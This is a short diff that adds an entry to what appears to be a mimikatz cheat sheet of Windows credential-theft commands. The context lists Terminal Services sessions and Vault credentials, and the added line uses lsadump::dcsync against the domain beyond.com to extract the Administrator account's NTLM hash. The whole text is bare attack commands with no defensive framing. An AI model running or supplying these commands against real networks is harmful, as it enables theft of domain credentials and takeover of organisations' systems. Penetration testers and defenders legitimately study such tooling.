@@ -47,3 +47,6 @@ mimikatz ts::sessions
 
 #List Vault credentials
 mimikatz vault::list
+
+#Get Administrators NTLM hash
+lsadump::dcsync /domain:beyond.com /user:Administrator
